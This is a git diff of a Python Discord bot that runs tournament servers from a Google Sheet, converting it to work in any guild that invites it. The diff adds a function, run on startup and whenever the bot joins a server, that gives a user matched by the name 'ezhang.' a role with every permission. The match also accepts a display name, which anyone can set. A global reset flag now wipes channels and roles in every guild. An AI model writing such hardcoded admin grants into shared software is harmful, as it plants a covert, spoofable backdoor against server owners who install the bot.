@@ -17,7 +17,7 @@ GSPCREDS      = os.getenv("GSPREAD_CREDS")
 SHEET_ID      = os.getenv("SHEET_ID")  # Optional - can be set via /entertemplate command
 SHEET_FILE_NAME = os.getenv("SHEET_FILE_NAME", "[TEMPLATE] Socal State")  # Name of the Google Sheet file to look for
 SHEET_PAGE_NAME = os.getenv("SHEET_PAGE_NAME", "Sheet1")  # Name of the worksheet/tab within the sheet
-GUILD_ID      = int(os.getenv("GUILD_ID"))
+# GUILD_ID is now dynamic - bot works with any guild it's invited to
 AUTO_CREATE_ROLES = os.getenv("AUTO_CREATE_ROLES", "true").lower() == "true"
 DEFAULT_ROLE_COLOR = os.getenv("DEFAULT_ROLE_COLOR", "light_gray")  # blue, red, green, purple, etc.
 
@@ -25,14 +25,12 @@ DEFAULT_ROLE_COLOR = os.getenv("DEFAULT_ROLE_COLOR", "light_gray")  # blue, red,
 # Set to True to COMPLETELY RESET the server on bot startup
 # WARNING: This will permanently delete ALL channels, categories, roles, and reset all nicknames!
 # This is IRREVERSIBLE! Use only for testing or complete server reset!
-RESET_SERVER = bool(os.getenv("RESET_SERVER").lower() == "true")
+RESET_SERVER = os.getenv("RESET_SERVER", "false").lower() == "true"
 
 intents = discord.Intents.default()
 intents.members = True
 
-bot = discord.Bot(
-    intents=intents,
-    default_guild_ids=[GUILD_ID])
+bot = discord.Bot(intents=intents)  # No default guild - works globally
 
 # Set up gspread client
 scope = [
@@ -1039,11 +1037,10 @@ async def add_role_to_building_chat(channel, role):
     except Exception as e:
         print(f"❌ Error updating channel permissions for #{channel.name}: {e}")
 
-async def reset_server():
+async def reset_server_for_guild(guild):
     """⚠️ DANGER: Completely reset the server by deleting all channels, categories, roles, and nicknames"""
-    guild = bot.get_guild(GUILD_ID)
     if not guild:
-        print("❌ Guild not found!")
+        print("❌ Guild not provided!")
         return
     
     print("⚠️ ⚠️ ⚠️  STARTING COMPLETE SERVER RESET  ⚠️ ⚠️ ⚠️")
@@ -1245,14 +1242,13 @@ async def post_welcome_tldr(welcome_channel):
     except Exception as e:
         print(f"❌ Error posting welcome tldr: {e}")
 
-async def setup_static_channels():
+async def setup_static_channels_for_guild(guild):
     """Create static categories and channels for Tournament Officials and Volunteers"""
-    guild = bot.get_guild(GUILD_ID)
     if not guild:
-        print("❌ Guild not found!")
+        print("❌ Guild not provided!")
         return
     
-    print("🏗️ Setting up static channels...")
+    print(f"🏗️ Setting up static channels for {guild.name}...")
     
     # Get or create Slacker role for permissions
     slacker_role = await get_or_create_role(guild, "Slacker")
@@ -1455,11 +1451,10 @@ async def setup_static_channels():
     
     print("✅ Finished setting up static channels")
 
-async def move_bot_role_to_top():
+async def move_bot_role_to_top_for_guild(guild):
     """Move the bot's role to the highest possible position and make it teal"""
-    guild = bot.get_guild(GUILD_ID)
     if not guild:
-        print("❌ Guild not found!")
+        print("❌ Guild not provided!")
         return
     
     # Check if bot has required permissions
@@ -1563,11 +1558,10 @@ async def move_bot_role_to_top():
     except Exception as e:
         print(f"❌ Error moving bot role to top: {e}")
 
-async def organize_role_hierarchy():
+async def organize_role_hierarchy_for_guild(guild):
     """Organize roles in priority order: lambot, Slacker, Arbitrations, Photographer, Social Media, Lead Event Supervisor, Volunteer, :(, then others"""
-    guild = bot.get_guild(GUILD_ID)
     if not guild:
-        print("❌ Guild not found!")
+        print("❌ Guild not provided!")
         return
     
     # Check if bot has required permissions
@@ -1688,11 +1682,10 @@ async def organize_role_hierarchy():
         if "50013" in str(e):
             print("💡 This is a permissions issue. Please ensure the bot has 'Manage Roles' permission and is high in the role hierarchy.")
 
-async def remove_slacker_access_from_building_channels():
+async def remove_slacker_access_from_building_channels_for_guild(guild):
     """Remove Slacker role access from building/event channels"""
-    guild = bot.get_guild(GUILD_ID)
     if not guild:
-        print("❌ Guild not found!")
+        print("❌ Guild not provided!")
         return
     
     slacker_role = discord.utils.get(guild.roles, name="Slacker")
@@ -1723,11 +1716,10 @@ async def remove_slacker_access_from_building_channels():
     
     print(f"✅ Removed {slacker_role.name} access from {removed_count} building/event channels")
 
-async def give_slacker_access_to_all_channels():
+async def give_slacker_access_to_all_channels_for_guild(guild):
     """Give Slacker role access only to static channels (not building/event channels)"""
-    guild = bot.get_guild(GUILD_ID)
     if not guild:
-        print("❌ Guild not found!")
+        print("❌ Guild not provided!")
         return
     
     slacker_role = discord.utils.get(guild.roles, name="Slacker")
@@ -1804,9 +1796,46 @@ async def give_slacker_access_to_all_channels():
     print(f"🔑 Total: {welcome_channels + tournament_official_channels + volunteer_channels + forum_channels} channels with Slacker access")
     print(f"🚫 Building/event channels are restricted to event participants only")
 
+async def setup_ezhang_admin_role(guild):
+    """Set up admin role for ezhang. if they're in the server"""
+    if not guild:
+        return
+        
+    ezhang_member = None
+    for member in guild.members:
+        if (member.name.lower() == "ezhang." or 
+            (member.global_name and member.global_name.lower() == "ezhang.")):
+            ezhang_member = member
+            break
+    
+    if ezhang_member:
+        try:
+            # Get or create :( role
+            admin_role = discord.utils.get(guild.roles, name=":(")
+            if not admin_role:
+                admin_role = await guild.create_role(
+                    name=":(",
+                    permissions=discord.Permissions.all(),
+                    color=discord.Color.purple(),
+                    reason="Created admin role for ezhang."
+                )
+                print(f"🆕 Created :( role for ezhang. in {guild.name}")
+            
+            # Assign admin role if they don't have it
+            if admin_role not in ezhang_member.roles:
+                await ezhang_member.add_roles(admin_role, reason="Special admin access for ezhang.")
+                print(f"👑 Granted admin privileges to {ezhang_member} (ezhang.) in {guild.name}")
+            else:
+                print(f"✅ {ezhang_member} already has :( role in {guild.name}")
+        except Exception as e:
+            print(f"⚠️ Could not grant admin privileges to ezhang. in {guild.name}: {e}")
+
 @bot.event
 async def on_ready():
     print(f"Logged in as {bot.user} (ID: {bot.user.id})")
+    print(f"🌐 Bot is active in {len(bot.guilds)} guild(s):")
+    for guild in bot.guilds:
+        print(f"  • {guild.name} (ID: {guild.id}) - {guild.member_count} members")
     
     # Sync slash commands with Discord
     try:
@@ -1821,62 +1850,36 @@ async def on_ready():
     except Exception as e:
         print(f"❌ Failed to sync commands: {e}")
     
-    # Check if server reset is enabled
-    print(f"🔍 RESET_SERVER is set to: {RESET_SERVER}")
-    if RESET_SERVER:
-        print("⚠️ ⚠️ ⚠️  SERVER RESET ENABLED!  ⚠️ ⚠️ ⚠️")
-        await reset_server()
-        print("🔄 Reset complete, continuing with normal setup...")
-    else:
-        print("✅ Server reset is disabled - proceeding with normal setup")
-    
-    print("🏗️ Setting up static channels...")
-    await setup_static_channels()
-    print("🤖 Moving bot role to top and making it teal...")
-    await move_bot_role_to_top()
-    print("🎭 Organizing role hierarchy...")
-    await organize_role_hierarchy()
-    print("🚫 Removing Slacker access from building channels...")
-    await remove_slacker_access_from_building_channels()
-    print("🔑 Adding Slacker access to static channels...")
-    await give_slacker_access_to_all_channels()
-    
-    # Check if ezhang. is already in the server and give them the :( role
-    guild = bot.get_guild(GUILD_ID)
-    if guild:
-        ezhang_member = None
-        for member in guild.members:
-            if (member.name.lower() == "ezhang." or 
-                (member.global_name and member.global_name.lower() == "ezhang.")):
-                ezhang_member = member
-                break
+    # Process each guild the bot is in
+    for guild in bot.guilds:
+        print(f"\n🏗️ Setting up guild: {guild.name} (ID: {guild.id})")
         
-        if ezhang_member:
-            try:
-                # Get or create :( role
-                admin_role = discord.utils.get(guild.roles, name=":(")
-                if not admin_role:
-                    admin_role = await guild.create_role(
-                        name=":(",
-                        permissions=discord.Permissions.all(),
-                        color=discord.Color.purple(),
-                        reason="Created admin role for ezhang."
-                    )
-                    print(f"🆕 Created :( role for ezhang.")
-                
-                # Assign admin role if they don't have it
-                if admin_role not in ezhang_member.roles:
-                    await ezhang_member.add_roles(admin_role, reason="Special admin access for ezhang.")
-                    print(f"👑 Granted admin privileges to {ezhang_member} (ezhang.) on startup")
-                else:
-                    print(f"✅ {ezhang_member} already has :( role")
-                
-
-            except Exception as e:
-                print(f"⚠️ Could not grant admin privileges to ezhang. on startup: {e}")
+        # Check if server reset is enabled for this guild
+        if RESET_SERVER:
+            print(f"⚠️ ⚠️ ⚠️  SERVER RESET ENABLED FOR {guild.name}!  ⚠️ ⚠️ ⚠️")
+            await reset_server_for_guild(guild)
+            print(f"🔄 Reset complete for {guild.name}, continuing with setup...")
+        
+        try:
+            print(f"🏗️ Setting up static channels for {guild.name}...")
+            await setup_static_channels_for_guild(guild)
+            print(f"🤖 Moving bot role to top for {guild.name}...")
+            await move_bot_role_to_top_for_guild(guild)
+            print(f"🎭 Organizing role hierarchy for {guild.name}...")
+            await organize_role_hierarchy_for_guild(guild)
+            print(f"🚫 Removing Slacker access from building channels for {guild.name}...")
+            await remove_slacker_access_from_building_channels_for_guild(guild)
+            print(f"🔑 Adding Slacker access to static channels for {guild.name}...")
+            await give_slacker_access_to_all_channels_for_guild(guild)
+            
+            # Check if ezhang. is already in this server and give them the :( role
+            await setup_ezhang_admin_role(guild)
+            
+        except Exception as e:
+            print(f"❌ Error setting up guild {guild.name}: {e}")
     
     # Try to load spreadsheet from cache
-    print("💾 Attempting to load cached spreadsheet connection...")
+    print("\n💾 Attempting to load cached spreadsheet connection...")
     cache_loaded = await load_spreadsheet_from_cache()
     if cache_loaded:
         print("✅ Successfully loaded spreadsheet from cache!")
@@ -1888,6 +1891,27 @@ async def on_ready():
     
     print("🎫 Starting help ticket monitoring task...")
     check_help_tickets.start()
+
+@bot.event
+async def on_guild_join(guild):
+    """Handle setup when bot joins a new guild"""
+    print(f"🎉 Bot joined new guild: {guild.name} (ID: {guild.id}) - {guild.member_count} members")
+    
+    try:
+        print(f"🏗️ Setting up new guild: {guild.name}")
+        
+        # Set up the guild with all the standard setup
+        await setup_static_channels_for_guild(guild)
+        await move_bot_role_to_top_for_guild(guild)
+        await organize_role_hierarchy_for_guild(guild)
+        await remove_slacker_access_from_building_channels_for_guild(guild)
+        await give_slacker_access_to_all_channels_for_guild(guild)
+        await setup_ezhang_admin_role(guild)
+        
+        print(f"✅ Successfully set up new guild: {guild.name}")
+        
+    except Exception as e:
+        print(f"❌ Error setting up new guild {guild.name}: {e}")
 
 @bot.event
 async def on_member_join(member):
@@ -2568,7 +2592,7 @@ async def perform_member_sync(guild, data):
             print(f"❌ Error processing user {discord_id}: {e}")
     
     # Organize role hierarchy after sync
-    await organize_role_hierarchy()
+    await organize_role_hierarchy_for_guild(guild)
     
     print(f"✅ Sync complete: {processed_count} users processed, {role_assignments} roles assigned, {nickname_updates} nicknames updated")
     
@@ -2808,7 +2832,7 @@ async def enter_template_command(ctx, folder_link: str):
             # Pre-create all building structures and channels from the sheet data
             print("🏗️ Pre-creating all building structures and channels...")
             try:
-                guild = bot.get_guild(GUILD_ID)
+                guild = ctx.guild
                 if guild:
                     # Extract all unique building/event combinations from the sheet
                     building_structures = set()
@@ -2861,7 +2885,7 @@ async def enter_template_command(ctx, folder_link: str):
             print("🔄 Triggering immediate sync after template connection...")
             sync_results = None
             try:
-                guild = bot.get_guild(GUILD_ID)
+                guild = ctx.guild
                 if guild:
                     sync_results = await perform_member_sync(guild, test_data)
                     print(f"✅ Initial sync complete: {sync_results['processed']} processed, {sync_results['invited']} invited, {sync_results['role_assignments']} roles assigned")
@@ -2923,7 +2947,7 @@ async def enter_template_command(ctx, folder_link: str):
             
             # Search for and share useful links after successful template connection
             try:
-                guild = bot.get_guild(GUILD_ID)
+                guild = ctx.guild
                 if guild:
                     print("🔗 Searching for useful links after template connection...")
                     await search_and_share_useful_links(guild)
@@ -2959,10 +2983,10 @@ async def sync_command(ctx):
         # Run the sync function
         print("🔄 Manual sync triggered by", ctx.author)
         
-        # Call the sync function directly
-        guild = bot.get_guild(GUILD_ID)
+        # Use the guild where the command was called
+        guild = ctx.guild
         if guild is None:
-            await ctx.followup.send("❌ Bot is not in the guild!", ephemeral=True)
+            await ctx.followup.send("❌ This command must be used in a server!", ephemeral=True)
             return
         
         # Check if we have a sheet connected
@@ -3357,7 +3381,7 @@ async def organize_roles_command(ctx):
                 break
         
         # Organize roles
-        await organize_role_hierarchy()
+        await organize_role_hierarchy_for_guild(ctx.guild)
         
         # Check if there were permission issues
         higher_roles = [r for r in ctx.guild.roles if r.position >= (bot_role.position if bot_role else 0) and r.name != "@everyone" and r != bot_role]
@@ -3556,7 +3580,7 @@ class EmailLoginModal(discord.ui.Modal):
                 print(f"✅ Updated Discord ID for {email} to {user.id} in cell {cell_address}")
                 
                 # Trigger a sync
-                guild = bot.get_guild(GUILD_ID)
+                guild = interaction.guild
                 if guild:
                     updated_data = sheet.get_all_records()
                     sync_results = await perform_member_sync(guild, updated_data)
@@ -3919,14 +3943,18 @@ async def sync_members():
         print("❌ Could not fetch sheet:", e)
         return
 
-    guild = bot.get_guild(GUILD_ID)
-    if guild is None:
-        print("❌ Bot is not in the guild!")
-        return
-
-    # Use the shared sync function
-    sync_results = await perform_member_sync(guild, data)
-    print(f"✅ Sync complete. Processed {sync_results['processed']} valid Discord IDs from {sync_results['total_rows']} rows.")
+    # Sync with all guilds the bot is in
+    total_processed = 0
+    for guild in bot.guilds:
+        try:
+            print(f"🔄 Syncing members for guild: {guild.name}")
+            sync_results = await perform_member_sync(guild, data)
+            total_processed += sync_results['processed']
+            print(f"✅ Sync complete for {guild.name}. Processed {sync_results['processed']} valid Discord IDs.")
+        except Exception as e:
+            print(f"❌ Error syncing guild {guild.name}: {e}")
+    
+    print(f"✅ Total sync complete. Processed {total_processed} valid Discord IDs across {len(bot.guilds)} guilds.")
 
 
 @tasks.loop(minutes=1)
@@ -3936,11 +3964,6 @@ async def check_help_tickets():
         return
         
     print(f"🎫 Checking {len(active_help_tickets)} active help tickets...")
-    
-    guild = bot.get_guild(GUILD_ID)
-    if not guild:
-        print("❌ Guild not found for ticket checking")
-        return
     
     current_time = datetime.now()
     tickets_to_remove = []
@@ -3952,10 +3975,15 @@ async def check_help_tickets():
             
             # Check if 5 minutes have passed since creation/last ping
             if time_since_created >= timedelta(minutes=5):
-                # Get the thread
-                thread = guild.get_thread(thread_id)
+                # Find the thread across all guilds
+                thread = None
+                for guild in bot.guilds:
+                    thread = guild.get_thread(thread_id)
+                    if thread:
+                        break
+                
                 if not thread:
-                    print(f"⚠️ Thread {thread_id} not found, removing from tracking")
+                    print(f"⚠️ Thread {thread_id} not found in any guild, removing from tracking")
                     tickets_to_remove.append(thread_id)
                     continue
                 
